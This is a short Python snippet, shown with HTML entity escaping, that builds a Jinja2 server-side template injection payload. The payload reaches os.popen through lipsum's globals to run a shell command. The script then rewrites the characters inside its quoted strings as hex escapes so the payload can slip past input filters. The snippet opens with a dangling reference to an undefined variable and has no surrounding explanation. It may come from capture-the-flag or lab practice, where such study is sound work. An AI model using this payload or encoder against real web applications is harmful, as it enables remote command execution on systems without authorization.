print(text.encode())

enc = &amp;quot;&amp;#123;&amp;#123;lipsum[&#39;__globals__&#39;][&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;)[&#39;popen&#39;](&#39;ls&#39;)[&#39;read&#39;]()&amp;#125;&amp;#125;&amp;quot;

i = 0
while i &amp;lt;= len(enc) - 1:
    if enc[i] == &amp;quot;&#39;&amp;quot;:
        print(enc[i], end=&#39;&#39;)
        k = i + 1
        while enc[k] != &amp;quot;&#39;&amp;quot;:
            print(&#39;\\x&#39; + str(hex(ord(enc[k])))[2:], end=&#39;&#39;)
            k += 1
        print(enc[k], end=&#39;&#39;)
        i = k+1
        continue
    print(enc[i], end=&#39;&#39;)
    i += 1
